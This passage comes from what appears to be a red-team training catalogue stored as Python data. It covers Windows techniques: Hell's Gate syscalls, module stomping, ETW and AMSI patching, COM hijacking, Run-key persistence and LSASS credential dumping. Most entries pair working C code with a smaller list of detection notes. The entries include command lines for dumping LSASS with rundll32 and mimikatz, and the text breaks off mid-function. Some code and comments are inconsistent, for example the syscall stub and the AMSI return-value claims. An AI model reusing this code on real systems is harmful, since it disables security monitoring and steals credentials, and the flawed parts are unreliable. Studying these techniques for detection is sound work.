            "Hell's Gate (by am0nsec & RtlMateusz) goes further: it dynamically resolves SSNs at runtime by "
            "scanning the in-memory ntdll for syscall stubs. Even if hooks are present, Hell's Gate "
            "detects the JMP patch and scans nearby functions to deduce the correct SSN — making it "
            "resilient to both static and dynamic analysis."
        ),
        "how_it_works": [
            "Locate ntdll.dll base address via PEB.Ldr (no GetModuleHandle — avoids API hooks).",
            "Walk ntdll's export table to find the target function (e.g. NtAllocateVirtualMemory).",
            "Read the first bytes of the stub: look for 'MOV EAX, <imm32>' — that immediate is the SSN.",
            "Hell's Gate: if the first byte is 0xE9 (JMP — EDR hook), scan neighbouring functions to infer the SSN by ordinal offset.",
            "Embed a syscall stub in your own code: mov r10,rcx / mov eax,<SSN> / syscall / ret.",
            "Call your stub with the same arguments as the NTDLL function.",
            "The CPU transitions to ring 0 directly — ntdll stubs (and their hooks) are never touched.",
        ],
        "code_example": r"""// Direct syscall example — NtAllocateVirtualMemory without touching ntdll
// SSN extracted at runtime using Hell's Gate technique

#include <windows.h>
#include <stdio.h>

typedef struct { WORD count; WORD limit; DWORD base; } DESCRIPTOR;

// ── SSN resolution (Hell's Gate) ────────────────────────────────────────────
DWORD GetSSN(const char *funcName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE   fn     = (PBYTE)GetProcAddress(hNtdll, funcName);

    // Check for EDR hook (JMP patch)
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 &&
        fn[3] == 0xB8) {
        // Clean stub: MOV R10,RCX / MOV EAX,<SSN>
        return *(DWORD *)(fn + 4);
    }

    if (fn[0] == 0xE9) {
        // JMP hook — scan down to find a clean neighbour
        // (neighbours have consecutive SSNs, so SSN = neighbourSSN ± offset)
        for (int i = 1; i < 500; i++) {
            PBYTE candidate = fn + (i * 32);  // approx stub spacing
            if (candidate[0] == 0x4C && candidate[3] == 0xB8)
                return *(DWORD *)(candidate + 4) - i;
        }
    }
    return 0;
}

// ── Inline syscall stub ──────────────────────────────────────────────────────
// At runtime, patch <SSN> into the MOV EAX instruction
NTSTATUS DoSyscall(DWORD ssn, HANDLE hProc, PVOID *base,
                   ULONG_PTR zeroBits, PSIZE_T regionSize,
                   ULONG allocType, ULONG protect) {
    NTSTATUS ret;
    __asm__ volatile (
        "mov r10, rcx\n\t"      // per Windows x64 calling convention
        "mov eax, %1\n\t"       // SSN
        "syscall\n\t"
        "mov %0, eax"
        : "=r"(ret)
        : "r"(ssn),
          "c"(hProc), "d"(base)  // RCX, RDX — other args on stack
        : "r10", "r8", "r9", "memory"
    );
    return ret;
}

int main(void) {
    DWORD ssn  = GetSSN("NtAllocateVirtualMemory");
    printf("[+] NtAllocateVirtualMemory SSN = 0x%02X\n", ssn);

    PVOID  base = NULL;
    SIZE_T sz   = 0x1000;

    NTSTATUS st = DoSyscall(ssn, GetCurrentProcess(), &base, 0, &sz,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("[+] Allocated @ %p  NTSTATUS=0x%08X\n", base, st);
    VirtualFree(base, 0, MEM_RELEASE);
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "Syscall instruction (0F 05) executed from memory outside ntdll.dll is a strong EDR signal.",
            "Stack traces showing syscall returns to non-ntdll addresses (kernel uses the return address for auditing).",
            "Kernel ETW: system call events where the calling address doesn't match known ntdll stub ranges.",
            "Static analysis: scan PE files for syscall byte patterns (4C 8B D1 B8 ?? ?? ?? ?? 0F 05) outside ntdll.",
            "Heuristic: processes that never call ntdll stubs but perform privileged operations are anomalous.",
            "SysWhispers artifacts: presence of SSN tables or characteristic stub sequences in code sections.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Demonstrates Hell's Gate SSN resolution: scans mock ntdll stubs, detects a hooked function, "
            "and infers the correct SSN from a clean neighbouring stub."
        ),
    },

    {
        "id": "module_stomping",
        "name": "Module Stomping",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1055.001",
        "tags": ["module stomping", "overwrite", "legitimate module", "memory evasion", "file-backed"],
        "short_desc": "Loads a legitimate DLL then overwrites its .text section with shellcode, making malicious memory appear file-backed.",
        "description": (
            "Security tools often distinguish between 'legitimate' and 'suspicious' memory by checking "
            "whether a memory region is backed by a file on disk. Anonymous (private) memory containing "
            "executable code is treated as suspicious; file-backed memory (loaded from a DLL on disk) is "
            "typically trusted.\n\n"
            "Module Stomping exploits this assumption. The attacker loads a legitimate but rarely-used "
            "DLL (e.g. clrjit.dll, wbemprox.dll) into the target process, then overwrites its .text "
            "section with shellcode. The memory still appears to be backed by the legitimate DLL file — "
            "the VAD (Virtual Address Descriptor) entry shows the correct file path.\n\n"
            "This defeats file-backed memory checks and makes the shellcode blend in with legitimate "
            "module memory. Combined with stomping a DLL that's already expected to be loaded "
            "(Module Overloading), this becomes even stealthier."
        ),
        "how_it_works": [
            "Choose a target DLL — one that's legitimate, large enough for your shellcode, and not commonly profiled.",
            "LoadLibraryEx(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES) loads the DLL without running DllMain or resolving imports.",
            "Parse the loaded DLL's PE headers to find the .text section VirtualAddress and size.",
            "VirtualProtect the .text section to PAGE_EXECUTE_READWRITE.",
            "Overwrite the beginning of .text with your shellcode bytes.",
            "Restore page protection to PAGE_EXECUTE_READ to avoid the RWX anomaly.",
            "Execute the shellcode by jumping to the stomped .text base address.",
            "The shellcode runs in memory that appears to be the legitimate DLL — VAD shows the DLL path.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// Shellcode placeholder (replace with payload)
unsigned char sc[] = { 0x90, 0x90, 0x90, 0xC3 };  // NOP NOP NOP RET

BOOL StompModule(const wchar_t *dllPath, PBYTE sc, SIZE_T scLen) {
    // 1. Load DLL without running DllMain (avoids detection from DllMain hooks)
    HMODULE hMod = LoadLibraryExW(dllPath, NULL,
                                    DONT_RESOLVE_DLL_REFERENCES);
    if (!hMod) {
        printf("[-] LoadLibraryEx failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Loaded %ls @ %p\n", dllPath, hMod);

    // 2. Parse PE to find .text section
    PBYTE base = (PBYTE)hMod;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    PBYTE  textAddr = NULL;
    SIZE_T textSize = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            textAddr = base + sec->VirtualAddress;
            textSize = sec->Misc.VirtualSize;
            break;
        }
    }

    if (!textAddr || scLen > textSize) {
        printf("[-] .text section not found or too small\n");
        return FALSE;
    }
    printf("[+] .text @ %p  size=0x%zX\n", textAddr, textSize);

    // 3. Make .text writable
    DWORD oldProt;
    VirtualProtect(textAddr, scLen, PAGE_EXECUTE_READWRITE, &oldProt);

    // 4. Overwrite with shellcode
    memcpy(textAddr, sc, scLen);
    printf("[+] Shellcode written to .text section of %ls\n", dllPath);

    // 5. Restore to RX (remove the RWX anomaly)
    VirtualProtect(textAddr, scLen, PAGE_EXECUTE_READ, &oldProt);

    // 6. Execute — memory appears to be legitimate DLL code
    printf("[*] Executing shellcode at %p (looks like %ls)\n", textAddr, dllPath);
    ((void(*)())textAddr)();

    return TRUE;
}

int main(void) {
    // clrjit.dll is large, rarely monitored, and infrequently loaded
    return StompModule(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll",
                        sc, sizeof(sc)) ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "VirtualProtect on a loaded module's .text section from outside the loader is anomalous.",
            "Compare in-memory module content against the on-disk file — hash mismatches flag stomped modules.",
            "pe-sieve / Moneta: scan all loaded modules for .text content that doesn't match the disk image.",
            "LoadLibraryEx with DONT_RESOLVE_DLL_REFERENCES for unusual DLLs (clrjit, wbemprox) is suspicious.",
            "Thread start address pointing into a legitimate DLL's .text but far from any known export entry point.",
            "Module load events for DLLs that are unexpected for the process type (no reason for clrjit in notepad).",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step: DLL load, .text section discovery, permission change, overwrite, "
            "and execution — with a memory map showing how the stomped region appears legitimate."
        ),
    },

    {
        "id": "etw_patching",
        "name": "ETW Patching",
        "category": "Advanced Evasion",
        "difficulty": "Intermediate",
        "platform": "Windows",
        "mitre_attack": "T1562.006",
        "tags": ["ETW", "patch", "telemetry", "blind", "EtwEventWrite", "logging bypass"],
        "short_desc": "Patches EtwEventWrite in ntdll to silence all ETW-based security telemetry from the current process.",
        "description": (
            "Event Tracing for Windows (ETW) is the primary telemetry backbone for Windows Defender, "
            "many EDR products, and security auditing. Providers (including the kernel and ntdll itself) "
            "emit structured events via EtwEventWrite in ntdll.dll. If this function is patched to "
            "return immediately, no events reach any ETW consumer — including security products.\n\n"
            "The patch is trivially simple: write a RET (0xC3) as the first byte of EtwEventWrite. "
            "All calls to this function become instant no-ops, effectively blinding any ETW-based "
            "detection for the lifetime of the process.\n\n"
            "A more surgical variant patches specific provider GUIDs or targets only Microsoft-Windows-"
            "Threat-Intelligence events (used by PPL-protected processes). Since ETW also underlies "
            ".NET's logging, AMSI's script-content logging, and PowerShell's ScriptBlock logging, "
            "this single patch can disable multiple security layers at once."
        ),
        "how_it_works": [
            "Get the address of EtwEventWrite: GetProcAddress(GetModuleHandleA('ntdll.dll'), 'EtwEventWrite').",
            "VirtualProtect the page containing EtwEventWrite to PAGE_EXECUTE_READWRITE.",
            "Write 0xC3 (RET instruction) to the first byte, optionally preceded by XOR EAX,EAX (return S_OK).",
            "Restore the original page protection with VirtualProtect.",
            "From this point on, all ETW events from this process are silently dropped.",
            "Optionally patch EtwEventWriteFull and NtTraceEvent for more complete coverage.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

BOOL PatchETW(void) {
    HMODULE ntdll     = GetModuleHandleA("ntdll.dll");
    PBYTE   etwWrite  = (PBYTE)GetProcAddress(ntdll, "EtwEventWrite");

    if (!etwWrite) {
        printf("[-] EtwEventWrite not found\n");
        return FALSE;
    }
    printf("[*] EtwEventWrite @ %p  first bytes: %02X %02X %02X\n",
           etwWrite, etwWrite[0], etwWrite[1], etwWrite[2]);

    // 1. Make the page writable
    DWORD oldProt;
    if (!VirtualProtect(etwWrite, 1, PAGE_EXECUTE_READWRITE, &oldProt)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        return FALSE;
    }

    // 2. Patch: write RET (0xC3) as first instruction
    //    Optionally: XOR EAX,EAX (31 C0) + RET (C3) = returns STATUS_SUCCESS
    etwWrite[0] = 0xC3;

    // 3. Restore protection
    VirtualProtect(etwWrite, 1, oldProt, &oldProt);

    printf("[+] EtwEventWrite patched → 0xC3 (RET)\n");
    printf("[*] All ETW events from this process are now silenced\n");
    return TRUE;
}

BOOL PatchScriptBlockLogging(void) {
    // PowerShell / .NET ScriptBlock logging also goes through ETW
    // Patching EtwEventWrite covers this automatically.
    // For extra coverage, also patch NtTraceEvent:
    HMODULE ntdll      = GetModuleHandleA("ntdll.dll");
    PBYTE   ntTrace    = (PBYTE)GetProcAddress(ntdll, "NtTraceEvent");
    DWORD   oldProt;

    VirtualProtect(ntTrace, 1, PAGE_EXECUTE_READWRITE, &oldProt);
    ntTrace[0] = 0xC3;
    VirtualProtect(ntTrace, 1, oldProt, &oldProt);

    printf("[+] NtTraceEvent patched\n");
    return TRUE;
}

int main(void) {
    PatchETW();
    PatchScriptBlockLogging();
    printf("[*] ETW blinded. Running payload...\n");
    // ... payload here — no telemetry will be logged
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "VirtualProtect on ntdll.dll's EtwEventWrite function is a near-certain indicator.",
            "Byte-level integrity checks: monitor the first bytes of EtwEventWrite for modification.",
            "Kernel ETW (via kernel provider) can detect user-mode ETW patching — some EDRs use kernel providers as fallback.",
            "Absence of expected ETW events from a process that should be generating them (behavioral gap).",
            "Hardware breakpoints / VMI-based monitoring can detect writes to ntdll code sections.",
            "ETW-TI (Threat Intelligence) provider in the kernel is unaffected by user-mode ETW patches.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Shows the EtwEventWrite function before and after patching — "
            "comparing the original stub bytes with the patched RET, and tracing what happens to an ETW event."
        ),
    },

    {
        "id": "amsi_bypass",
        "name": "AMSI Bypass (AmsiScanBuffer Patch)",
        "category": "Advanced Evasion",
        "difficulty": "Intermediate",
        "platform": "Windows",
        "mitre_attack": "T1562.001",
        "tags": ["AMSI", "bypass", "AmsiScanBuffer", "patch", "PowerShell", "antimalware"],
        "short_desc": "Patches AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN, bypassing script content scanning.",
        "description": (
            "The Antimalware Scan Interface (AMSI) is a Windows API that allows applications to pass "
            "content to any registered antimalware product for scanning before execution. PowerShell, "
            "VBScript, JScript, .NET, and WMI all call AMSI before running dynamic content.\n\n"
            "The core scanning function is AmsiScanBuffer in amsi.dll. Patching it to immediately "
            "return AMSI_RESULT_CLEAN (value 1) causes all security products' AMSI providers to report "
            "every scan as clean — allowing arbitrary malicious scripts, shellcode, or .NET assemblies "
            "to execute without detection.\n\n"
            "This is one of the most widely used techniques in PowerShell-based attacks. The patch is "
            "just 6 bytes and can be applied from within PowerShell itself, from .NET reflection, or "
            "from a native loader. Modern variants obfuscate the patch to defeat static signature detection."
        ),
        "how_it_works": [
            "Load amsi.dll: it's already loaded in PowerShell and any host using AMSI.",
            "Resolve AmsiScanBuffer: GetProcAddress(GetModuleHandleA('amsi.dll'), 'AmsiScanBuffer').",
            "VirtualProtect the function page to PAGE_EXECUTE_READWRITE.",
            "Overwrite the first bytes with: MOV EAX, 0x80070057 (E_INVALIDARG) + RET, or XOR EAX,EAX / RET (returns AMSI_RESULT_CLEAN).",
            "Restore page protection.",
            "All subsequent AMSI scans in this process return clean — Defender and other AV providers are bypassed.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// AMSI result codes
#define AMSI_RESULT_CLEAN          1
#define AMSI_RESULT_NOT_DETECTED   1

BOOL BypassAMSI(void) {
    HMODULE amsi = GetModuleHandleA("amsi.dll");
    if (!amsi) {
        // amsi.dll not loaded yet — load it
        amsi = LoadLibraryA("amsi.dll");
    }
    if (!amsi) { printf("[-] amsi.dll not found\n"); return FALSE; }

    PBYTE scanBuf = (PBYTE)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scanBuf) { printf("[-] AmsiScanBuffer not found\n"); return FALSE; }

    printf("[*] AmsiScanBuffer @ %p\n", scanBuf);
    printf("[*] Original bytes: %02X %02X %02X %02X %02X %02X\n",
           scanBuf[0], scanBuf[1], scanBuf[2],
           scanBuf[3], scanBuf[4], scanBuf[5]);

    DWORD oldProt;
    VirtualProtect(scanBuf, 6, PAGE_EXECUTE_READWRITE, &oldProt);

    // Patch option A: return E_INVALIDARG immediately
    // MOV EAX, 0x80070057 (B8 57 00 07 80) + RET (C3)
    BYTE patchA[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    // Patch option B: XOR EAX,EAX (31 C0) + RET (C3) → returns 0 (AMSI_RESULT_CLEAN)
    // BYTE patchB[] = { 0x31, 0xC0, 0xC3 };

    memcpy(scanBuf, patchA, sizeof(patchA));
    VirtualProtect(scanBuf, 6, oldProt, &oldProt);

    printf("[+] AmsiScanBuffer patched → always returns E_INVALIDARG\n");
    printf("[+] All AMSI scans in this process now return CLEAN\n");
    return TRUE;
}

// ── PowerShell equivalent (for reference) ────────────────────────────────────
// The same patch can be applied from PowerShell via reflection:
//
//   $a=[Ref].Assembly.GetTypes() | ForEach-Object {
//     if ($_.Name -like "*iUtils") { $_ }
//   }
//   $b=$a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
//   $c=$b.GetValue($null)
//   [IntPtr]$ptr=$c
//   $buf=[System.Runtime.InteropServices.Marshal]::ReadByte($ptr)
//   [System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 0xeb, 0x06)

int main(void) {
    return BypassAMSI() ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "VirtualProtect on amsi.dll AmsiScanBuffer function — monitored by all major EDRs.",
            "Byte-level integrity: monitor first bytes of AmsiScanBuffer for modification (0xB8, 0x31 0xC0, etc.).",
            "AMSI provider events: if scan calls stop producing results for a process, it may be patched.",
            "PowerShell ScriptBlock logging (before AMSI runs) can catch obfuscated bypass attempts.",
            "ETW Microsoft-Antimalware-Scan-Interface provider: missing scan events from a host that normally scans.",
            "Constrained Language Mode in PowerShell prevents reflection-based bypasses.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Shows AmsiScanBuffer's original prologue bytes, applies the patch, "
            "and demonstrates a mock scan returning CLEAN after patching."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # PERSISTENCE
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "com_hijacking",
        "name": "COM Hijacking",
        "category": "Persistence",
        "difficulty": "Intermediate",
        "platform": "Windows",
        "mitre_attack": "T1546.015",
        "tags": ["COM", "CLSID", "registry", "hijack", "persistence", "DLL"],
        "short_desc": "Registers a malicious CLSID in HKCU to redirect COM object instantiation to attacker-controlled code.",
        "description": (
            "The Component Object Model (COM) is Windows' object-oriented IPC framework. When code calls "
            "CoCreateInstance(CLSID), Windows searches the registry for the InprocServer32 path in this order: "
            "HKCU\\Software\\Classes\\CLSID first, then HKLM\\Software\\Classes\\CLSID.\n\n"
            "Because HKCU requires no elevated privileges, any user can register a CLSID there. If a "
            "privileged process (Task Scheduler, Explorer, svchost) instantiates a COM object whose CLSID "
            "is registered in HKCU, Windows loads the attacker's DLL instead of the legitimate one — "
            "even from an unprivileged account.\n\n"
            "This gives persistent code execution every time the target application starts, with no "
            "administrator privileges needed. Many Windows scheduled tasks and Explorer extensions "
            "instantiate well-known COM objects, making them reliable persistence targets."
        ),
        "how_it_works": [
            "Identify a CLSID used by a high-value target (Explorer, Task Scheduler, MMC) that is registered only in HKLM.",
            "Use ProcMon to capture 'HKCU\\...\\CLSID\\{...}\\InprocServer32 → NAME NOT FOUND' — these are hijackable CLSIDs.",
            "Create the key: HKCU\\Software\\Classes\\CLSID\\{target-CLSID}\\InprocServer32",
            "Set the default value to the path of your malicious DLL.",
            "Set ThreadingModel to 'Apartment' (or match the original).",
            "The next time the target process loads, it queries HKCU first and loads your DLL.",
            "Your DLL's DllMain(DLL_PROCESS_ATTACH) runs with the target process's privileges.",
            "For persistence: the registry key survives reboots — execution happens every time the app starts.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// Target: {BCDE0395-E52F-467C-8E3D-C4579291692E}
// Used by MsftEdit — loaded by many Office applications
// Registered in HKLM only → hijackable from HKCU
#define TARGET_CLSID L"{BCDE0395-E52F-467C-8E3D-C4579291692E}"
#define PAYLOAD_DLL  L"C:\\Users\\user\\AppData\\Local\\Temp\\payload.dll"

BOOL InstallCOMHijack(void) {
    wchar_t keyPath[512];
    swprintf_s(keyPath, 512,
        L"Software\\Classes\\CLSID\\%s\\InprocServer32",
        TARGET_CLSID);

    HKEY hKey;
    LSTATUS ls = RegCreateKeyExW(
        HKEY_CURRENT_USER, keyPath, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (ls != ERROR_SUCCESS) {
        printf("[-] RegCreateKeyEx failed: %ld\n", ls);
        return FALSE;
    }

    // Set default value = path to malicious DLL
    ls = RegSetValueExW(hKey, NULL, 0, REG_SZ,
                         (BYTE *)PAYLOAD_DLL,
                         (DWORD)((wcslen(PAYLOAD_DLL) + 1) * sizeof(wchar_t)));
    if (ls != ERROR_SUCCESS) { RegCloseKey(hKey); return FALSE; }

    // Set ThreadingModel to avoid COM loader errors
    const wchar_t *tm = L"Apartment";
    RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ,
                    (BYTE *)tm, (DWORD)((wcslen(tm) + 1) * sizeof(wchar_t)));

    RegCloseKey(hKey);
    printf("[+] COM hijack installed:\n");
    printf("    HKCU\\%ls\n", keyPath);
    printf("    → %ls\n", PAYLOAD_DLL);
    printf("[*] Will fire next time an app calls CoCreateInstance(%ls)\n", TARGET_CLSID);
    return TRUE;
}

BOOL RemoveCOMHijack(void) {
    wchar_t keyPath[512];
    swprintf_s(keyPath, 512, L"Software\\Classes\\CLSID\\%s", TARGET_CLSID);
    RegDeleteTreeW(HKEY_CURRENT_USER, keyPath);
    printf("[*] COM hijack removed\n");
    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc > 1 && strcmp(argv[1], "remove") == 0)
        return RemoveCOMHijack() ? 0 : 1;
    return InstallCOMHijack() ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "New HKCU\\Software\\Classes\\CLSID entries that mirror HKLM CLSIDs are a direct indicator.",
            "Monitor RegCreateKey / RegSetValueEx calls to HKCU\\...\\CLSID paths.",
            "Compare HKCU CLSID registrations against a baseline — any new entry deserves review.",
            "ProcMon: DLL load events where the loaded path is user-writable (AppData, Temp, etc.).",
            "Application Whitelisting / AppLocker: block DLL loads from user-writable directories.",
            "Autoruns (Sysinternals): specifically highlights HKCU COM hijack candidates.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Walks through the COM lookup order, shows the HKCU registry key creation, "
            "and animates the hijack firing when a mock CoCreateInstance call is made."
        ),
    },

    {
        "id": "registry_persistence",
        "name": "Registry Run Key Persistence",
        "category": "Persistence",
        "difficulty": "Beginner",
        "platform": "Windows",
        "mitre_attack": "T1547.001",
        "tags": ["registry", "Run key", "persistence", "autorun", "startup", "HKCU"],
        "short_desc": "Adds a value to a Registry Run key so the payload executes automatically on every user logon.",
        "description": (
            "Registry Run keys are the simplest and oldest persistence mechanism on Windows. Values "
            "added to these keys cause the OS to execute the specified command at user login (HKCU) or "
            "system startup (HKLM). No elevation is required for HKCU keys.\n\n"
            "Key locations:\n"
            "• HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — current user, every logon\n"
            "• HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — all users, needs admin\n"
            "• HKCU\\...\\RunOnce — fires once then deletes itself\n"
            "• HKLM\\...\\RunServices — legacy service autostart\n\n"
            "Despite being extremely well-known and monitored, Run keys remain widely used in real "
            "malware because they are reliable, survive reboots, and require minimal code. They are "
            "typically combined with other techniques (masquerading, DLL sideloading) to reduce visibility."
        ),
        "how_it_works": [
            "Choose the persistence scope: HKCU (no privileges) or HKLM (admin required).",
            "Open the Run key with RegOpenKeyExA(HKCU, 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', KEY_WRITE).",
            "Write the payload path: RegSetValueExA(hKey, 'UpdateService', REG_SZ, payloadPath).",
            "The value name is arbitrary — malware often uses names that mimic legitimate software.",
            "Close the key handle.",
            "On the next user logon, Windows reads the Run key and launches the payload.",
            "Clean up with RegDeleteValueA when persistence is no longer needed.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

#define RUN_KEY  "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define VALUE_NAME "WindowsUpdateHelper"

BOOL InstallRunPersistence(const char *payloadPath) {
    HKEY hKey;
    LSTATUS ls = RegOpenKeyExA(
        HKEY_CURRENT_USER,  // no privileges required
        RUN_KEY,
        0, KEY_WRITE, &hKey);

    if (ls != ERROR_SUCCESS) {
        printf("[-] RegOpenKeyEx failed: %ld\n", ls);
        return FALSE;
    }

    ls = RegSetValueExA(
        hKey,
        VALUE_NAME,         // value name — blend in
        0,
        REG_SZ,
        (BYTE *)payloadPath,
        (DWORD)(strlen(payloadPath) + 1));

    RegCloseKey(hKey);

    if (ls == ERROR_SUCCESS) {
        printf("[+] Persistence installed:\n");
        printf("    HKCU\\%s\n", RUN_KEY);
        printf("    %s = \"%s\"\n", VALUE_NAME, payloadPath);
        printf("[*] Will execute on next logon\n");
        return TRUE;
    }
    printf("[-] RegSetValueEx failed: %ld\n", ls);
    return FALSE;
}

BOOL RemovePersistence(void) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_WRITE, &hKey);
    LSTATUS ls = RegDeleteValueA(hKey, VALUE_NAME);
    RegCloseKey(hKey);
    if (ls == ERROR_SUCCESS) { printf("[+] Persistence removed\n"); return TRUE; }
    printf("[-] Value not found\n");
    return FALSE;
}

// Alternative: scheduled task persistence (no Run key, harder to detect)
BOOL InstallScheduledTask(const char *payloadPath) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "schtasks /create /tn \"MicrosoftEdgeUpdateCore\" "
        "/tr \"%s\" /sc onlogon /f /rl highest",
        payloadPath);
    return system(cmd) == 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload_path> [remove]\n", argv[0]);
        return 1;
    }
    if (argc > 2 && strcmp(argv[2], "remove") == 0)
        return RemovePersistence() ? 0 : 1;

    return InstallRunPersistence(argv[1]) ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "Autoruns (Sysinternals) — the gold standard for Run key enumeration and reputation checking.",
            "Monitor RegSetValueEx writes to any Run / RunOnce key path via ETW or EDR.",
            "Baseline comparison: new Run key values that weren't present before are immediately suspicious.",
            "Value names mimicking legitimate software (MicrosoftUpdate, WindowsDefender) — check the actual path.",
            "Payload path in user-writable directories (AppData, Temp) combined with a Run key entry.",
            "Windows Defender: Run key monitoring is a built-in behavioral rule.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Live demo: creates a real HKCU Run key value pointing to a harmless echo command, "
            "shows it in the registry, then removes it — demonstrating install and cleanup."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # CREDENTIAL ACCESS
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "lsass_dumping",
        "name": "LSASS Memory Dumping",
        "category": "Credential Access",
        "difficulty": "Advanced",
        "platform": "Windows",
        "mitre_attack": "T1003.001",
        "tags": ["LSASS", "credentials", "dump", "MiniDump", "comsvcs", "Mimikatz"],
        "short_desc": "Dumps the LSASS process memory to extract NTLM hashes, Kerberos tickets, and plaintext credentials.",
        "description": (
            "The Local Security Authority Subsystem Service (lsass.exe) is the Windows process "
            "responsible for authentication. It caches credentials in memory: NTLM password hashes, "
            "Kerberos TGTs, and (in older/misconfigured systems) WDigest plaintext passwords.\n\n"
            "Dumping LSASS memory and processing it offline with tools like Mimikatz, pypykatz, or "
            "Impacket allows an attacker to extract these credentials — enabling Pass-the-Hash, "
            "Pass-the-Ticket, and lateral movement across the network.\n\n"
            "Methods range from noisy to stealthy:\n"
            "• Task Manager: right-click lsass → Create dump file (requires admin, very detectable)\n"
            "• comsvcs.dll MiniDump via rundll32 (classic, flagged by most AV)\n"
            "• MiniDumpWriteDump API (programmatic, easily hooked)\n"
            "• Direct memory read via NtReadVirtualMemory with kernel handles (EDR bypass)\n"
            "• Shadow copies / VSS to access the SAM hive offline\n"
            "• ProcDump (signed Microsoft tool — often allowed by allowlists)"
        ),
        "how_it_works": [
            "Obtain SeDebugPrivilege: AdjustTokenPrivileges with SE_DEBUG_NAME.",
            "OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPID).",
            "Call MiniDumpWriteDump(hLsass, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL).",
            "The dump file contains all of LSASS's virtual memory including credential caches.",
            "Transfer dump offline and process with: mimikatz 'sekurlsa::minidump lsass.dmp' + 'sekurlsa::logonpasswords'.",
            "Alternative (comsvcs): rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full",
            "Stealthier: use NtReadVirtualMemory directly with a handle obtained via kernel driver or PPL bypass.",
        ],
        "code_example": r"""#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")

DWORD GetLsassPID(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe)) {
        if (!_wcsicmp(pe.szExeFile, L"lsass.exe")) {
            pid = pe.th32ProcessID;
            break;
        }
    }
    CloseHandle(snap);
    return pid;
}

BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                           TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp = { .PrivilegeCount = 1 };
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}

BOOL DumpLSASS(const wchar_t *outPath) {
    if (!EnableDebugPrivilege()) {
        printf("[-] SeDebugPrivilege failed — need admin\n");
        return FALSE;
    }

    DWORD pid = GetLsassPID();
    if (!pid) { printf("[-] LSASS not found\n"); return FALSE; }
    printf("[+] LSASS PID = %lu\n", pid);

    HANDLE hLsass = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hLsass) {
        printf("[-] OpenProcess failed: %lu  (PPL protection active?)\n",
               GetLastError());
        return FALSE;
    }

    HANDLE hFile = CreateFileW(outPath, GENERIC_WRITE, 0, NULL,
